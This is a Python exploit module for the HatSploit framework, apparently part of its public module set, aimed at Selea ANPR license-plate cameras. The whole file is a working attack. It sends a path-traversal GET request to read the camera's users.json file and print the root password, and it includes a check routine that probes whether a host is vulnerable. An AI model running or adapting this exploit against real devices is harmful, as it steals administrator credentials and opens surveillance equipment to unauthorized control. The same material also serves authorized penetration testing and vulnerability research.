"""
This module requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

import json

from hatsploit.lib.module import Module
from pex.proto.http import HTTPClient


class HatSploitModule(Module, HTTPClient):
    details = {
        "Category": "exploit",
        "Name": "Selea ANPR Camera Password Disclosure",
        "Module": "exploit/linux/selea/anpr_password_disclosure",
        "Authors": [
            "Ivan Nikolsky (enty8080) - module developer",
            "LiquidWorm (liquidworm) - vulnerability researcher",
        ],
        "Description": "Selea ANPR Camera password disclosure exploit.",
        "Platform": "linux",
        "Rank": "high",
    }

    options = {
        "HOST": {
            "Description": "Remote host.",
            "Value": None,
            "Type": "ip",
            "Required": True,
        },
        "PORT": {
            "Description": "Remote port.",
            "Value": 81,
            "Type": "port",
            "Required": True,
        },
        "USERNAME": {
            "Description": "Default username.",
            "Value": "admin",
            "Type": None,
            "Required": True,
        },
    }

    def exploit(self, remote_host, remote_port, username):
        response = self.http_request(
            method="GET",
            host=remote_host,
            port=remote_port,
            path="/CFCARD/images/SeleaCamera/../../../../../../../../../../mnt/data/auth/users.json",
        )

        try:
            creds = json.loads(response.text)
            password = creds["root_pwd"]

            self.print_table(
                "Credentials", ("Username", "Password"), (username, password)
            )
        except Exception:
            self.print_warning(
                f"Target vulnerable, but default username is not {username}."
            )

    def check(self):
        remote_host, remote_port, _ = self.parse_options(self.options)

        response = self.http_request(
            method="GET",
            host=remote_host,
            port=remote_port,
            path="/CFCARD/images/SeleaCamera/../../../../../../../../../../mnt/data/auth/users.json",
        )

        if not response or response.status_code != 200:
            return False

        return True

    def run(self):
        remote_host, remote_port, username = self.parse_options(self.options)

        self.exploit(remote_host, remote_port, username)
